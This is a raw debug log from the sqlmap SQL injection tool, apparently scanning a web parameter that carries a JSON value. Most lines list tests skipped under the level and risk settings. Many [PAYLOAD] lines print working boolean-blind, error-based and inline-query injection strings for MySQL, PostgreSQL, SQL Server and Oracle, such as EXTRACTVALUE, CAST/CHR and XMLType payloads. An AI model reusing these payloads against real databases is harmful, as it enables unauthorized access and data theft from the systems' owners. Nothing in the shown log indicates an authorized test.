[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1)

[16:22:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'

[16:22:03] [PAYLOAD] (SELECT (CASE WHEN (3321=6807) THEN '[{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' ELSE (SELECT 6807 UNION SELECT 5700) END))

[16:22:03] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:03] [PAYLOAD] (SELECT (CASE WHEN (4222=4222) THEN '[{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' ELSE (SELECT 2101 UNION SELECT 4622) END))

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because the level (4) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:22:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND EXTRACTVALUE(8420,CONCAT(0x5c,0x7178716271,(SELECT (ELT(8420=8420,1))),0x7178766a71)) AND (3954=3954

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND EXTRACTVALUE(8420,CONCAT(0x5c,0x7178716271,(SELECT (ELT(8420=8420,1))),0x7178766a71))

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND EXTRACTVALUE(8420,CONCAT(0x5c,0x7178716271,(SELECT (ELT(8420=8420,1))),0x7178766a71)) AND ('DRCP'='DRCP

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND EXTRACTVALUE(8420,CONCAT(0x5c,0x7178716271,(SELECT (ELT(8420=8420,1))),0x7178766a71)) AND 'bHNf'='bHNf

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND EXTRACTVALUE(8420,CONCAT(0x5c,0x7178716271,(SELECT (ELT(8420=8420,1))),0x7178766a71))-- witB

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:22:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 3248=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3248=3248) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND (3667=3667

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 3248=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3248=3248) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 3248=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3248=3248) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND ('RaIt'='RaIt

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 3248=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3248=3248) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND 'udqH'='udqH

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 3248=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3248=3248) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)-- ueVg

[16:22:03] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 1760 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1760=1760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND (9364=9364

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 1760 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1760=1760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 1760 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1760=1760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND ('SOHf'='SOHf

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 1760 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1760=1760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND 'Levi'='Levi

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 1760 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1760=1760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))-- taHr

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)

[16:22:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 8411=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8411=8411) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (1481=1481

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 8411=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8411=8411) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 8411=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8411=8411) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('HTpv'='HTpv

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 8411=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8411=8411) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'ezQO'='ezQO

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 8411=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8411=8411) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- MixI

[16:22:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the risk (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the level (5) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the level (2) is higher than the provided (1)

[16:22:04] [INFO] testing 'Generic inline queries'

[16:22:04] [PAYLOAD] (SELECT CONCAT(CONCAT('qxqbq',(CASE WHEN (7245=7245) THEN '1' ELSE '0' END)),'qxvjq'))

[16:22:04] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'ClickHouse inline queries' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'

